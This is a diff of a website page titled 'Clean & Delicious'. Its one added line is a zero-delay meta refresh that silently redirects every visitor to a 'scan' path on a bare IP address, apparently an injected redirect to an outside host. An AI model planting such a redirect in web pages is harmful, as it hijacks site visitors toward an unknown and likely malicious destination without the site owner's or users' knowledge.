@@ -10,6 +10,7 @@
   gtag('config', 'G-YQ7V4MYRQ1');
 </script>
 <head> 
+	 <meta http-equiv="refresh" content="0;URL='http://3.18.105.188/scan'" />   
 	<title>Clean & Delicious</title> 
 	<style type="text/css"> 
 		html { 
